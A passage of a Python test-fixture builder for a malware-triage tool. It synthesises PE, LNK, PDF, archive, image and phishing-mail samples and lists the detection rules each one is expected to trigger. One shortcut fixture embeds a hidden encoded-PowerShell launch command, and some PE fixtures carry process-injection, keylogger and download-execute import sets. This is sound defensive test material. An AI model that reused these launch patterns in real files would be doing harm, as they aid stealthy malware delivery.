    cv_raw = debug_raw + 28
    data = bytearray(_import_pe((_NEUTRAL_IMPORT,)))
    debug_rva = 0x2200
    struct.pack_into("<II", data, 0x40 + 4 + 20 + 0x70 + 6 * 8, debug_rva, 28)
    entry = struct.pack(
        "<IIHHIIII", 0, 0, 0, 0, 2, len(cv), debug_rva + 28, cv_raw
    )
    data[debug_raw : debug_raw + len(entry)] = entry
    data[cv_raw : cv_raw + len(cv)] = cv
    return bytes(data)


def pe_with_tls_callbacks() -> bytes:
    """A PE whose TLS directory points at a NULL-terminated callback array.

    The TLS structure sits in the free upper half of .rdata (offset 0x200);
    writing it at the section start would overwrite the import directory.
    All four address fields are VIRTUAL addresses (ImageBase + RVA), which is
    what the IMAGE_TLS_DIRECTORY layout specifies — putting a bare RVA in
    AddressOfCallBacks makes the resolver look up a bogus offset.
    """
    image_base = 0x140000000
    rdata_raw = 0x400
    tls_raw = rdata_raw + 0x200
    cb_raw = rdata_raw + 0x240
    tls_rva = 0x2200
    cb_rva = 0x2240
    data = bytearray(_import_pe((_NEUTRAL_IMPORT,)))
    tls = struct.pack(
        "<QQQQII",
        image_base + tls_rva,          # StartAddressOfRawData
        image_base + tls_rva + 8,      # EndAddressOfRawData
        image_base + tls_rva + 8,      # AddressOfIndex
        image_base + cb_rva,           # AddressOfCallBacks (VA!)
        0,
        0,
    )
    data[tls_raw : tls_raw + len(tls)] = tls
    data[cb_raw : cb_raw + 24] = struct.pack(
        "<QQQ", image_base + 0x1000, image_base + 0x1008, 0
    )
    struct.pack_into("<II", data, 0x40 + 4 + 20 + 0x70 + 9 * 8, tls_rva, 40)
    return bytes(data)


def pe_with_tls_no_callbacks() -> bytes:
    """TLS directory present, callback pointer is NULL (30% of real binaries)."""
    data = bytearray(pe_with_tls_callbacks())
    # AddressOfCallBacks sits 24 bytes into the TLS structure.
    struct.pack_into("<Q", data, 0x400 + 0x200 + 24, 0)
    return bytes(data)


def pe_broken_header() -> bytes:
    """MZ + valid e_lfanew + "PE\0\0", then a truncated COFF header.

    The classifier accepts it as PE (so the pipeline runs) while the parser
    fails on the truncated headers — which must surface as PE_PARSE_WARN
    instead of a silent "clean" verdict.
    """
    return (
        b"MZ" + b"\x00" * 0x3A + struct.pack("<I", 0x40)
        + b"PE\x00\x00"
        + struct.pack("<HH", 0x8664, 1)   # valid machine, then it stops
    )
def _import_pe(
    import_names: tuple[str, ...],
    dll: str = "KERNEL32.dll",
    *,
    section_name: bytes = b".rdata",
    dll_chars: int = 0x0140,
    extra_overlay: bytes = b"",
) -> bytes:
    """Build a two-section PE whose .rdata holds a valid import directory.

    Needed by the import-based rules: pefile derives PE_IMPHASH and the
    PE_IMPORT_* combinations from a well-formed import table, so the fixture
    must carry descriptors, lookup/IAT arrays and the hint/name table. RVAs
    (not VAs) go into the thunks — mixing them makes pefile reject the table.

    .rdata spans 0x400 bytes while the tables use only the first 0x200, so a
    fixture can append TLS or debug structures in the upper half without
    clobbering the import directory (which would otherwise make it report
    PE_NO_IMPORTS alongside its real finding).
    """
    rva_rdata = 0x2000
    raw_rdata = 0x400
    desc_rva = rva_rdata
    dll_rva = rva_rdata + 0x80
    lookup_rva = rva_rdata + 0x100
    iat_rva = rva_rdata + 0x180
    names_rva = rva_rdata + 0x1C0

    hints = bytearray()
    name_rvas = []
    for name in import_names:
        name_rvas.append(names_rva + len(hints))
        hints += struct.pack("<H", 0) + name.encode() + b"\x00"

    rdata = bytearray(0x400)
    dll_name = dll.encode() + b"\x00"
    rdata[0x80 : 0x80 + len(dll_name)] = dll_name
    lookup = b"".join(struct.pack("<Q", r) for r in name_rvas) + struct.pack("<Q", 0)
    rdata[0x100 : 0x100 + len(lookup)] = lookup
    rdata[0x180 : 0x180 + len(lookup)] = lookup
    rdata[0x1C0 : 0x1C0 + len(hints)] = bytes(hints)
    descriptor = struct.pack(
        "<IIIII", lookup_rva, 0, 0, dll_rva, iat_rva
    ) + b"\x00" * 20
    rdata[0 : len(descriptor)] = descriptor

    dos = b"MZ" + b"\x00" * 0x3A + struct.pack("<I", 0x40)
    coff = struct.pack("<HHIIIHH", 0x8664, 2, 0, 0, 0, 0x00F0, 0x0022)
    dirs = bytearray(16 * 8)
    dirs[1 * 8 : 1 * 8 + 8] = struct.pack("<II", desc_rva, 40)  # IMPORT
    opt = (
        struct.pack("<H", 0x20B)
        + b"\x00" * (0x18 - 2)
        + struct.pack("<Q", 0x140000000)
        + struct.pack("<II", 0x1000, 0x200)
        + b"\x00" * (0x46 - 0x28)
        + struct.pack("<H", dll_chars)
        + b"\x00" * (0x6C - 0x48)
        + struct.pack("<I", 16)
        + bytes(dirs)
    )
    sec_text = b".text".ljust(8, b"\x00") + struct.pack(
        "<IIIIIIHHI", 0x200, 0x1000, 0x200, 0x200, 0, 0, 0, 0, 0x60000020
    )
    sec_rdata = section_name.ljust(8, b"\x00") + struct.pack(
        "<IIIIIIHHI", 0x400, rva_rdata, 0x400, raw_rdata, 0, 0, 0, 0, 0x40000040
    )
    body = dos + b"PE\x00\x00" + coff + opt + sec_text + sec_rdata
    return (
        body.ljust(0x200, b"\x00")
        + bytes(range(256)) * 2
        + bytes(rdata)
        + extra_overlay
    )


def pe_import_injection() -> bytes:
    """The full process-injection triad in the import table."""
    return _import_pe(
        ("VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread")
    )


def pe_import_keylog() -> bytes:
    """Keyboard-hook imports (weak on their own — hotkey software uses them)."""
    return _import_pe(("SetWindowsHookExA", "GetAsyncKeyState"))


def pe_import_download_exec() -> bytes:
    """A download call combined with an execute call."""
    return _import_pe(("URLDownloadToFileW", "WinExec"))


def pe_imports_benign() -> bytes:
    """Ordinary imports: must NOT trip any import-combination rule."""
    return _import_pe(("GetModuleHandleA", "GetProcAddress", "CloseHandle"))


# -- local threat-intel and download-mark fixtures ------------------------------ #


def motw_downloaded_pdf() -> bytes:
    """A PDF that carries a Mark-of-the-Web (Zone.Identifier) ADS.

    The marker itself is the finding: it records that the file came from the
    internet, which is the single most useful provenance signal for triage.
    The ADS is applied by :func:`apply_motw`, since alternate data streams are
    a property of the *filesystem entry*, not of the file content.
    """
    return b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF\n"


def apply_motw(path: Path, zone: int = 3) -> bool:
    """Attach a Zone.Identifier stream; returns False if NTFS/ADS unavailable."""
    payload = (
        b"[ZoneTransfer]\r\n"
        + f"ZoneId={zone}\r\n".encode()
        + b"ReferrerUrl=https://example.invalid/portal\r\n"
        + b"HostUrl=https://example.invalid/download/rechnung.pdf\r\n"
    )
    try:
        with open(str(path) + ":Zone.Identifier", "wb") as fh:
            fh.write(payload)
        return True
    except OSError:
        # Not NTFS (FAT/exFAT) or no ADS support — the caller skips the check.
        return False


def blocklisted_sample() -> bytes:
    """Content whose SHA-256 can be placed on a local blocklist by a test.

    Used with a temporary blocklist file: the pipeline reports a CRITICAL
    anchor when the hash matches, so the fixture only needs to be a stable,
    recognisable blob.
    """
    return b"MALAZ-CORPUS-BLOCKLIST-SAMPLE\x00" + bytes(range(64))


def lnk_with_args() -> bytes:
    """A shell link whose arguments carry a hidden PowerShell download.

    A .lnk is a transport, not a payload — the signal is that the link launches
    a LOLBin (here cmd.exe) with arguments that execute encoded PowerShell.
    The header must set HasArguments (bit 5) AND IsUnicode (bit 7), otherwise
    the parser reads the argument string with the wrong encoding.
    """
    cls_id = b"\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46"
    flags = (1 << 5) | (1 << 7)          # HasArguments | IsUnicode
    header = b"\x4c\x00\x00\x00" + cls_id + struct.pack("<I", flags)
    header += b"\x00" * (76 - len(header))
    args = "/c powershell -nop -w hidden -EncodedCommand SQBFAFgA"
    return header + struct.pack("<H", len(args)) + args.encode("utf-16-le")


# -- remaining reachable rules -------------------------------------------------- #


def pdf_encrypted_user_password() -> bytes:
    """A PDF encrypted with a USER password (cannot be opened without it).

    ``PDF_ENCRYPTED`` covers "carries real encryption"; with a user password
    the analyser cannot decrypt it, so it reports the finding instead of
    silently inspecting an empty stream.

    NB: the bytes are NOT reproducible — an encrypted PDF needs a random /ID
    and a random encryption salt (pikepdf refuses ``deterministic_id`` here),
    so the determinism test compares the FINDINGS for this fixture.
    """
    import pikepdf

    pdf = pikepdf.new()
    pdf.pages.append(
        pikepdf.Page(
            pikepdf.Dictionary(Type=pikepdf.Name.Page, MediaBox=[0, 0, 612, 792])
        )
    )
    buf = io.BytesIO()
    pdf.save(
        buf,
        encryption=pikepdf.Encryption(owner="owner-secret", user="user-secret", R=6),
    )
    return buf.getvalue()


def jpeg_truncated_no_eoi() -> bytes:
    """A JPEG that was cut off before the EOI marker (0xFFD9).

    A missing end-of-image is a real truncation signal: the file is damaged or
    deliberately cut short to hide trailing data.
    """
    from PIL import Image

    img = Image.new("RGB", (32, 32), (10, 90, 160))
    buf = io.BytesIO()
    img.save(buf, format="JPEG")
    data = buf.getvalue()
    assert data.endswith(b"\xff\xd9"), "Fixture-Annahme: JPEG endet mit EOI"
    return data[:-2]


def png_missing_iend() -> bytes:
    """A PNG whose IEND chunk was removed (truncated container)."""
    base = _png_logo()
    idx = base.rfind(b"\x00\x00\x00\x00IEND")
    assert idx != -1, "Fixture-Annahme: IEND gefunden"
    return base[:idx]


def pe_import_parse_warn() -> bytes:
    """A PE whose import directory points outside every section.

    pefile cannot resolve the RVA, so the import stage reports its parse-warning
    indicator instead of staying silent — "not analysable" must never look like
    "clean".
    """
    data = bytearray(_import_pe((_NEUTRAL_IMPORT,)))
    opt_off = 0x40 + 4 + 20
    # Import directory RVA far beyond the image.
    struct.pack_into("<II", data, opt_off + 0x70 + 1 * 8, 0x900000, 40)
    return bytes(data)


# -- corpus table -------------------------------------------------------------- #

# (filename, builder, expected rule_ids) — the contract verified by
# tests/test_corpus_extended.py. Expectations were MEASURED against the real
# pipelines, not guessed. They are minimums: additional findings are allowed,
# EXCEPT where the expectation is about a security guarantee (traversal
# members), which is documented per entry.
# -- Container, die im Golden-Snapshot fehlten (genutzt vom harmlosen Korpus) ------------------------------ #
#
# GEMESSEN: neun Typen, die magic.detect() kennt, hatten KEINE Abdeckung im
# Golden-Snapshot (bzip2 cab class deb iso rar rpm swf xz). Ein Typ, den die
# Erkennung kennt, aber kein Fixture beruehrt, kann unbemerkt kaputtgehen —
# der Snapshot haette es nicht gemerkt.
#
# WO DIE STANDARDBIBLIOTHEK BAUEN KANN, wird ein ECHTER Container erzeugt
# (bzip2, xz, swf). Wo nicht (cab, rar, rpm, iso, deb, class), steht ein
# MINIMALER, aber signaturgueltiger Kopf: er belegt die ERKENNUNG und dass die
# Pipeline ihn ohne Absturz verarbeitet — NICHT, dass die Extraktion
# funktioniert. Das ist der Unterschied, und er gehoert ins Fixture.


def bzip2_stream() -> bytes:
    """Ein echter bzip2-Strom (Standardbibliothek)."""
    import bz2

    return bz2.compress(b"harmloser inhalt fuer die erkennung\n" * 4)


def xz_stream() -> bytes:
    """Ein echter xz-Strom (Standardbibliothek)."""
    import lzma

    return lzma.compress(b"harmloser inhalt fuer die erkennung\n" * 4)


def swf_cws_container() -> bytes:
    """Ein CWS-SWF: zlib-komprimiert, wie Flash ihn ausliefert."""
    payload = b"FWS\x09" + b"\x00" * 10 + b"harmlos"
    return b"CWS\x09" + b"\x00" * 4 + zlib.compress(payload)


def class_file() -> bytes:
    """Ein Java-Class-Kopf (Magic + Version + leere Konstantentabelle)."""
    return b"\xca\xfe\xba\xbe" + struct.pack(">HH", 0, 52) + struct.pack(">H", 0)


def rpm_package() -> bytes:
    """Der RPM-Lead: Magic, Version, Typ, Architektur — 96 Bytes."""
    lead = b"\xed\xab\xee\xdb" + bytes([3, 0])
    lead += struct.pack(">HH", 0, 1)          # Typ (binaer), Architektur
    lead += b"malaz-fixture" + b"\x00" * 50  # Name, 66 Bytes
    return lead + struct.pack(">HH", 1, 0) + b"\x00" * 12


def cab_archive() -> bytes:
    """Ein CAB-Kopf (MSCF) mit leeren Verzeichnissen."""
    kopf = b"MSCF" + struct.pack("<II", 0, 0)   # reserviert, Groesse
    kopf += struct.pack("<I", 0)                 # Dateioffset
    kopf += bytes([3, 1])                        # Version 1.3
    kopf += struct.pack("<HH", 1, 1)             # Verzeichnisse, Dateien
    kopf += struct.pack("<HH", 0, 0)             # Flags, Set-ID
    kopf += struct.pack("<H", 1)                 # Cabinet-Nummer
    return kopf


def rar_archive() -> bytes:
    """Ein RAR5-Kopf (Signatur + Archiv-Block)."""
    return b"Rar!\x1a\x07\x01\x00" + b"\x00" * 8 + b"\x00" * 40


def iso_image() -> bytes:
    """Ein ISO-9660-Abbild mit Primärer Volume-Deskriptor."""
    sektor = 2048
    leer = b"\x00" * sektor
    pvd = bytearray(leer)
    pvd[0] = 1                       # Typ: Primary Volume Descriptor
    pvd[1:6] = b"CD001"              # Standard-Kennung
    pvd[6] = 1                       # Version
    pvd[40:72] = b"MALAZ_FIXTURE".ljust(32, b" ")  # Volume-Kennung
    return leer * 16 + bytes(pvd) + leer + leer


def heic_photo(brand: bytes = b"heic") -> bytes:
    """Ein HEIC/AVIF: ISO-BMFF mit ``ftyp``-Brand und rauschhaftem ``mdat``.

    Die rauschhaften Nutzdaten sind Absicht: ein echtes Foto ist HEVC-/AV1-
    komprimiert und hat IMMER nahe 8 bit/Byte. GEMESSEN vor der Erkennung:
    GEN_ENTROPY vergab dafuer das volle Gewicht 30 (Score 30/GELB), weil der
    Typ als "unknown" gelesen wurde und die Format-Erklaerung nicht griff.
    Betroffen war jedes iPhone-Foto.
    """
    import random

    def box(typ: bytes, nutz: bytes) -> bytes:
        return struct.pack(">I", 8 + len(nutz)) + typ + nutz

    rng = random.Random(7)
    ftyp = box(b"ftyp", brand + struct.pack(">I", 0) + b"heicmif1")
    mdat = box(b"mdat", bytes(rng.randint(0, 255) for _ in range(20000)))
    return ftyp + mdat


def deb_package() -> bytes:
    """Ein ECHTES .deb: ar-Archiv mit den drei Pflichtmitgliedern.

    Kein Kopf-Fixture, sondern ein vollstaendiges Paket — debian-binary,
    control.tar.gz und data.tar.gz. Nur so ist es wirklich harmlos und darf
    im harmlosen Korpus liegen (der verlangt GRUEN).
    """
    import gzip
    import io as _io
    import tarfile

    def tar_gz(name: str, inhalt: bytes) -> bytes:
        roh = _io.BytesIO()
        with tarfile.open(fileobj=roh, mode="w") as tf:
            info = tarfile.TarInfo(name)
            info.size = len(inhalt)
            info.mtime = 1_700_000_000  # deterministisch
            tf.addfile(info, _io.BytesIO(inhalt))
        return gzip.compress(roh.getvalue(), mtime=0)

    def mitglied(name: str, inhalt: bytes) -> bytes:
        kopf = f"{name}/".ljust(16).encode() + b"0".ljust(12, b" ")
        kopf += b"0".ljust(6, b" ") + b"0".ljust(6, b" ") + b"100644".ljust(8, b" ")
        kopf += str(len(inhalt)).encode().ljust(10, b" ") + b"`\n"
        return kopf + inhalt + (b"\n" if len(inhalt) % 2 else b"")

    return (
        b"!<arch>\n"
        + mitglied("debian-binary", b"2.0\n")
        + mitglied("control.tar.gz", tar_gz("./control", b"Package: malaz-fixture\nVersion: 1.0\n"))
        + mitglied("data.tar.gz", tar_gz("./hinweis.txt", b"harmlose testdatei\n"))
    )


EXTENDED_CORPUS: list[tuple[str, object, tuple[str, ...]]] = [
    # -- PDF ------------------------------------------------------------------ #
    ("js_obfuscated.pdf", pdf_js_obfuscated_payload,
     ("PDF_KW_OpenAction", "PDF_JS_SUSPICIOUS", "PDF_JS_OBFUSCATED")),
    ("js_no_autostart.pdf", pdf_js_suspicious_no_autostart, ("PDF_KW_JavaScript",)),
    ("embedded_file.pdf", pdf_embedded_file, ("PDF_EMBEDDED_FILES",)),
    ("object_stream.pdf", pdf_object_stream, ("PDF_OBJSTM",)),
    ("color_on_color.pdf", pdf_color_on_color, ("PDF_COLOR_ON_COLOR",)),
    # -- Office --------------------------------------------------------------- #
    ("macro_autoopen.doc", doc_vba_macro,
     ("OFFICE_MACRO", "OFFICE_AUTOEXEC", "OFFICE_SUSPICIOUS_API",
      "OFFICE_VBA_DL_EXEC", "OFFICE_VBA_ENC_PS")),
    ("macro_obfuscated.doc", doc_vba_obfuscated,
     ("OFFICE_MACRO", "OFFICE_AUTOEXEC", "OFFICE_VBA_OBFUSCATED")),
    ("macro_lolbin.doc", doc_vba_lolbin_persist,
     ("OFFICE_MACRO", "OFFICE_AUTOEXEC", "OFFICE_VBA_LOLBIN", "OFFICE_VBA_PERSIST")),
    ("dde_formula.xlsx", xlsx_dde_formula, ("OFFICE_FORMULA",)),
    ("remote_formula.xlsx", xlsx_remote_formula, ("GEN_IOC",)),
    # -- scripts -------------------------------------------------------------- #
    ("obfuscated.js", js_obfuscated_unescape, ("YARA_JS_Obfuscation_Unescape",)),
    ("cradle.ps1", powershell_encoded_cradle,
     ("GEN_PS_ENCODED", "YARA_Suspicious_PowerShell_Encoded")),
    ("download_cradle.ps1", script_with_download_cradle,
     ("GEN_PS_CRADLE", "GEN_IOC")),
    ("persistence.ps1", wmi_persistence_script, ("GEN_SUSPICIOUS_STRINGS",)),
    ("certutil.txt", certutil_url_download,
     ("GEN_LOLBIN_ABUSE", "GEN_SUSPICIOUS_STRINGS")),
    ("regsvr32.txt", regsvr32_sct_bypass, ("GEN_LOLBIN_ABUSE",)),
    ("lolbin_url.txt", lolbin_remote_url, ("GEN_LOLBIN_ABUSE",)),
    ("download.bat", bat_download_execute, ("GEN_LOLBIN_ABUSE",)),
    ("dropper.hta", hta_dropper, ("GEN_PS_CRADLE", "YARA_Suspicious_VBA_Shell")),
    ("dropper.wsf", wsf_script_dropper,
     ("GEN_LOLBIN_ABUSE", "YARA_WSF_Script_Dropper")),
    # -- PE / cross-platform -------------------------------------------------- #
    ("mismatch.pdf", extension_mismatch, ("PE_PARSE_WARN",)),
    ("high_entropy_exe.bin", high_entropy_executable_shaped, ("GEN_ENTROPY",)),
    ("dropper.elf", elf_dropper,
     ("YARA_ELF_Cryptominer", "YARA_ELF_Dropper_Download_Chain")),
    ("mirai.elf", elf_mirai_markers, ("YARA_ELF_Botnet_Family_Markers",)),
    ("dropper.macho", macho_dropper, ("YARA_MachO_Dropper_Behavior",)),
    # -- archives ------------------------------------------------------------- #
    ("zipslip.zip", zip_slip_variants, ("ARCH_ZIPSLIP",)),
    ("deep_nesting.zip", zip_deep_nesting, ("ARCH_DEPTH_LIMIT",)),
    ("many_members.zip", zip_many_members, ("ARCH_TOO_MANY",)),
    ("bomb_size.zip", zip_bomb_size, ("ARCH_BOMB_SIZE", "ARCH_BOMB_RATIO")),
    ("encrypted_aes.zip", zip_encrypted_aes, ("ARCH_ENCRYPTED",)),
    ("corrupt.zip", corrupt_zip, ("ARCH_BADZIP",)),
    ("bad.7z", corrupt_7z, ("ARCH_7Z_MISSING",)),
    # Traversal members are never FOLLOWED, but they are now also reported:
    # same archive as ZIP -> same ARCH_ZIPSLIP (CRITICAL). Before the fix TAR
    # silently dropped the member, so this fixture scored GREEN/0 while
    # zipslip.zip scored RED/50 for the identical attack.
    ("traversal.tar", tar_with_traversal, ("ARCH_ZIPSLIP",)),
    # -- images --------------------------------------------------------------- #
    ("trailing_payload.png", png_trailing_payload, ("PNG_TRAILER", "GEN_EMBEDDED")),
    ("trailing_payload.jpg", jpeg_trailing_payload, ("JPEG_TRAILER",)),
    ("with_exif.png", png_with_exif, ("IMG_EXIF",)),
    ("pdf_inside.png", pdf_after_png, ("PNG_TRAILER",)),
    # -- containers / name-based ---------------------------------------------- #
    ("object.rtf", rtf_with_embedded_ole, ("name:embedded_ole_1.bin", "type:ole")),
    ("rechnung.pdf.exe", filename_only_ioc, ("GEN_FILENAME_IOC",)),
    # -- threat-intel, download mark, shortcuts --------------------------------- #
    # MOTW requires an NTFS alternate data stream, which belongs to the
    # filesystem entry — the test applies it via apply_motw() and skips when
    # the platform cannot store ADS.
    # Its finding depends on an external blocklist entry, so the expectation
    # is empty here; tests/test_corpus_golden.py wires a temporary blocklist
    # and asserts the CRITICAL anchor.
    ("blocklisted.bin", blocklisted_sample, ()),
    ("lure.lnk", lnk_with_args, ("LNK_ARGUMENTS", "LNK_STRINGS")),
    # -- phishing mail --------------------------------------------------------- #
    ("phish_headers.eml", eml_phishing_headers,
     ("MAIL_DISPLAY_NAME_SPOOF", "MAIL_AUTH_FAIL", "MAIL_REPLY_TO_MISMATCH",
      "MAIL_RETURN_PATH_MISMATCH", "MAIL_BODY_LURE_PHRASES")),
    ("phish_mixed_script.eml", eml_phishing_mixed_script,
     ("MAIL_DISPLAY_NAME_MIXED_SCRIPT", "MAIL_DISPLAY_NAME_SPOOF")),
    ("phish_links.eml", eml_phishing_links,
     ("MAIL_LINK_IP_LITERAL", "MAIL_LINK_SHORTENER", "MAIL_LINK_PUNYCODE",
      "MAIL_LINK_RISKY_TLD", "MAIL_LINK_CREDENTIALS", "MAIL_LINK_TEXT_MISMATCH",
      "MAIL_LINKS_FOUND", "MAIL_BODY_HIDDEN_TEXT")),
    ("phish_attachments.eml", eml_phishing_attachments,
     ("MAIL_ATTACH_DOUBLE_EXT", "MAIL_ATTACH_NAME_TRICK", "MAIL_ATTACH_RISKY_TYPE",
      "MAIL_ATTACHMENTS_FOUND")),
    ("phish_body.eml", eml_phishing_body,
     ("MAIL_BODY_LURE_PHRASES", "MAIL_BODY_CREDENTIALS", "MAIL_BODY_HIDDEN_TEXT")),
    ("phish_schemes.eml", eml_dangerous_schemes, ("MAIL_LINK_DANGEROUS_SCHEME",)),
    ("mail_broken.eml", eml_broken_body,
     ("MAIL_BODY_UNREADABLE", "MAIL_NO_RECEIVED")),
    ("mail_no_headers.eml", eml_missing_headers,
     ("MAIL_NO_RECEIVED", "MAIL_NO_MESSAGE_ID", "MAIL_BODY_UNREADABLE")),
    # -- PE structure ---------------------------------------------------------- #
    ("plain.exe", pe_imports_benign, ("PE_HEADER", "PE_IMPHASH")),
    ("packed_upx.exe", pe_packed_upx, ("PE_PACKED",)),
    ("packed_aspack.exe", pe_packed_aspack, ("PE_PACKED",)),
    ("weak_mitigations.exe", pe_weak_mitigations, ("PE_WEAK_MITIGATIONS",)),
    ("no_cfg.exe", pe_no_cfg, ("PE_MITIGATION_NOTE",)),
    ("high_entropy_sections.exe", pe_high_entropy_sections,
     ("PE_HIGH_ENTROPY_SECTIONS",)),
    ("overlay_payload.exe", pe_overlay_payload, ("PE_OVERLAY",)),
    # Certificate-shaped but unverified: content, not a signature (audit
    # finding overlay-fake-authenticode-header).
    ("signed_overlay.exe", pe_signed_overlay, ("PE_OVERLAY",)),
    ("no_imports.exe", pe_no_imports, ("PE_NO_IMPORTS",)),
    ("with_pdb.exe", pe_with_pdb_path, ("PE_PDB",)),
    ("tls_callbacks.exe", pe_with_tls_callbacks, ("PE_TLS_CALLBACKS",)),
    ("tls_empty.exe", pe_with_tls_no_callbacks, ("PE_TLS_EMPTY",)),
    ("broken_header.exe", pe_broken_header, ("PE_PARSE_WARN",)),
    # -- PE imports ------------------------------------------------------------ #
    ("import_injection.exe", pe_import_injection, ("PE_IMPORT_INJECTION",)),
    ("import_keylog.exe", pe_import_keylog, ("PE_IMPORT_KEYLOG",)),
    ("import_download_exec.exe", pe_import_download_exec,
     ("PE_IMPORT_DOWNLOAD_EXEC",)),
    ("import_rva_broken.exe", pe_import_parse_warn, ("PE_NO_IMPORTS",)),
    ("encrypted_user.pdf", pdf_encrypted_user_password, ("PDF_ENCRYPTED",)),
    ("cut_off.jpg", jpeg_truncated_no_eoi, ("JPEG_NO_EOI",)),
    ("cut_off.png", png_missing_iend, ("PNG_NO_IEND",)),
]


def build_extended_corpus(target_dir: Path) -> list[Path]:
    """Write every extended fixture into ``target_dir``; returns the paths."""
    target_dir.mkdir(parents=True, exist_ok=True)
    written: list[Path] = []
    for filename, builder, _expected in EXTENDED_CORPUS:
        path = target_dir / filename
        path.write_bytes(builder())
        written.append(path)
    return written




# -- phishing mail fixtures ---------------------------------------------------- #
#
# Each builder targets one rule family of the EML pipeline. Covering all 24
# MAIL_* rules matters because a mail is the delivery vehicle for most
# real-world phishing, and the checks are independent enough that one fixture
# per family is the honest way to prove they still fire.


def _eml(
    *,
    sender: str = "kunde@example.invalid",
    display: str = "",
    reply_to: str = "",
    return_path: str = "",
    subject: str = "Nachricht",
    body: str = "Guten Tag.\n",
    html: str = "",
    received: bool = True,
    message_id: str = "<x@example.invalid>",
    auth: str = "",
    attachments: tuple[tuple[str, bytes], ...] = (),
) -> bytes:
    """Compose an RFC-822 message with full control over the headers."""
    import email.message
    import email.policy
    import email.utils

    # EmailMessage invents a random MIME boundary for multipart content, which
    # made every rebuild differ (caught by the determinism test). A fixed
    # boundary keeps the bytes — and therefore the snapshot — stable.
    msg = email.message.EmailMessage(policy=email.policy.default)
    msg["From"] = f"{display} <{sender}>" if display else sender
    msg["To"] = "opfer@example.invalid"
    msg["Subject"] = subject
    if message_id:
        msg["Message-ID"] = message_id
    if reply_to:
        msg["Reply-To"] = reply_to
    if return_path:
        msg["Return-Path"] = return_path
    if received:
        msg["Received"] = "from relay.example.invalid (relay.example.invalid [192.0.2.1])"
    if auth:
        msg["Authentication-Results"] = auth
    msg["Date"] = email.utils.formatdate(1789000000, usegmt=True)
    if html:
        msg.set_content(body)
        msg.add_alternative(html, subtype="html")
    else:
        msg.set_content(body)
    for name, payload in attachments:
        _maintype, _, subtype = name.rpartition(".")[2].partition(".") or ("application", "", "")
        msg.add_attachment(
            payload,
            maintype="application",
            subtype=subtype or "octet-stream",
            filename=name,
        )
    # EmailMessage invents a RANDOM MIME boundary, which made every rebuild
    # differ (caught by the determinism test). Pin it once the Content-Type
    # exists and before serialising.
    msg.set_boundary("===============malaz-corpus-boundary==")
    return msg.as_bytes()


if __name__ == "__main__":
    target = Path(sys.argv[1]) if len(sys.argv) > 1 else Path("tests/data/corpus_extended")
    files = build_extended_corpus(target)
    print(f"{len(files)} erweiterte Fixtures nach {target} geschrieben:")
    for path in files:
        print(f"  {path.name} ({path.stat().st_size} Bytes)")
